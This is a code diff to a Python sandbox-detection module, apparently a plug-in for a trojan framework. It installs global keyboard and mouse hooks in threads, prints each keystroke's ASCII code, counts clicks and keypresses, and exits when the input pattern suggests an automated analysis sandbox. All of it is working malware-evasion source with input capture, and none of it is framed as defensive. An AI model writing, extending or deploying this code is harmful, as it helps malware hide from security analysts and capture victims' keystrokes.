@@ -4,6 +4,7 @@ import time
 import sys
 import pyHook
 import win32gui
+import threading
 
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
@@ -11,8 +12,6 @@ kernel32 = ctypes.windll.kernel32
 keystrokes = 0
 mouse_clicks = 0
 double_clicks = 0
-
-print("inside the sandbox_detect module")
 
 
 class LASTINPUTINFO(ctypes.Structure):
@@ -37,6 +36,19 @@ def get_last_input():
 
     return elapsed
 
+def threader(hookDevice):
+    if hookDevice == "keyboard":
+        # create and register a hook manager
+        k2 = pyHook.HookManager()
+        k2.SubscribeKeyDown(get_key_press)
+        k2.HookKeyboard()
+    else:
+        k1 = pyHook.HookManager()
+        k1.SubscribeMouseAllButtonsDown(get_mouse_press)
+        k1.HookMouse()
+
+    win32gui.PumpMessages()
+
 
 def get_mouse_press(event):
     global mouse_clicks
@@ -49,20 +61,22 @@ def get_mouse_press(event):
 
     return True
 
+
 def get_key_press(event):
     global mouse_clicks
     global keystrokes
     global keypress_time
-
+    print(str(event.Ascii))
     if event.Ascii >= 32 and event.Ascii < 127:
         keystrokes += 1
         keypress_time = time.time()
         detection(event)
-
+        
     return True
 
 
 def detect_sandbox():
+    print("[*] inside the sandbox_detect module")
     global max_keystrokes
     max_keystrokes = random.randint(10, 25)
     global max_mouse_clicks
@@ -87,17 +101,14 @@ def detect_sandbox():
     detection_complete = False
     global last_input
     last_input = get_last_input()
+    global k2
+    list = []
+    list.append("keyboard")
+    list.append("mouse")
+    for hookDevice in list:
+        t = threading.Thread(target=threader, args=(hookDevice,))
+        t.start()
 
-    # create and register a hook manager
-    kl = pyHook.HookManager()
-    kl.KeyDown = get_key_press
-    kl.MouseLeftDown = get_mouse_press
-    kl.MouseMiddleDown = get_mouse_press
-    kl.MouseRightDown = get_mouse_press
-
-    kl.HookKeyboard()
-    kl.HookMouse()
-    win32gui.PumpMessages()
 
 
 def detection(event):
@@ -133,6 +144,7 @@ def detection(event):
                     if first_double_click is None:
                         # grab the timestamp of the first double click
                         first_double_click = time.time()
+                        previous_timestamp = keypress_time
                         return
 
                     else:
@@ -141,7 +153,7 @@ def detection(event):
                             if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                                 sys.exit(1)
 
-                # we are happy there's enough user input
+            # we are happy there's enough user input
             if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                 ctypes.windll.user32.PostQuitMessage(0)
                 return
@@ -156,4 +168,7 @@ def detection(event):
 
 def run(**args):
     detect_sandbox()
-    return("We are okay!")
+    return "We are okay!"
+
+
+run()
